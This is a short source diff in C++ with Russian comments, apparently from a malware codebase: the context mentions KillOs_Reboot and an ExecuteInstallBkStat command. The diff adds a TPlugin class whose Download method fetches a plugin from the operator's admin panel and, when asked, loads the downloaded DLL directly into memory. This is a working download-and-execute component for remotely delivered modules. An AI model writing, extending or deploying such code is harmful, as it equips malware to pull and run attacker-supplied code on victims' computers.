@@ -9,7 +9,6 @@
 #include "Task.h"
 #include "md5.h"
 #include "KillOs_Reboot.h"
-#include "DllLoader.h"
 #include "DbgRpt.h"
 
 //---------------------------------------------------------------------------
@@ -1022,4 +1021,55 @@ bool Plugin::ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args)
 
 	STR::Free(ParamList);
 	return true;
+}
+
+
+//*****************************************************************************
+//                                        TPlugin
+//*****************************************************************************
+
+
+TPlugin::TPlugin(const char*   PluginName)
+	: TMemoryDLL(NULL)
+{
+	FName = PluginName;
+	FData = NULL;
+    FSize = 0;
+}
+
+TPlugin::TPlugin(const string& PluginName)
+	: TMemoryDLL(NULL)
+{
+	FName = PluginName;
+	FData = NULL;
+    FSize = 0;
+}
+
+TPlugin::~TPlugin()
+{
+	if (FData)
+		MemFree(FData);
+}
+
+//------------------------------------------
+//  Download - функция скачивает плагин из
+//             админки и, при необходимости,
+//             загружает в память скачанную
+//             длл
+//
+//  LoadLibrary - признак необходимости
+//                загрузки скачанно длл
+//------------------------------------------
+bool TPlugin::Download(bool LoadLibrary)
+{
+	// Запрещаем повторное скачивание
+	if (Handle() || FData || FName.IsEmpty())
+		return false;
+
+	FData = Plugin::Download(FName.t_str(), NULL, &FSize, true);
+
+	if (FData && LoadLibrary)
+		Load(FData);
+
+	return FData != NULL;
 }
